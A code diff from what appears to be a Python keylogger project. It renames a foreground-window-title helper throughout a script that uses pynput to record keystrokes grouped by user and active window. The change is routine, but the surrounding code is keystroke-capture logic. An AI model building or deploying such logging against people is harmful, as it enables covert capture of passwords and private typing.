@@ -4,7 +4,7 @@ from threading import Thread
 from pynput.keyboard import Key, Listener
 
 from keylogger import read_key
-from screen import getForegroundWindowTitle
+from screen import get_active_window_title
 
 
 # Current user
@@ -16,7 +16,7 @@ data = {user : {} }
 # Current timestamp
 timestamp = 0
 
-last_window = getForegroundWindowTitle()
+last_window = get_active_window_title()
 last_key = ""
 
 # stop window thread when true. Used for debug
@@ -40,10 +40,10 @@ def get_data(_key, window=None):
 
     key = read_key(_key)
     
-    if window is None: window = getForegroundWindowTitle()
+    if window is None: window = get_active_window_title()
 
     if key == "\n": timestamp += 1
-    elif window == last_window:  update_data(window, key)
+    elif window == last_window: update_data(window, key)
     else: update_data(window, key)
 
     last_key = key
@@ -54,7 +54,7 @@ def window_listener():
     global last_window, stop_thread, timestamp
 
     while True and not stop_thread:
-        window = getForegroundWindowTitle()
+        window = get_active_window_title()
         if window is None: continue
         if window != last_window:
             if last_key != "\n": timestamp += 1
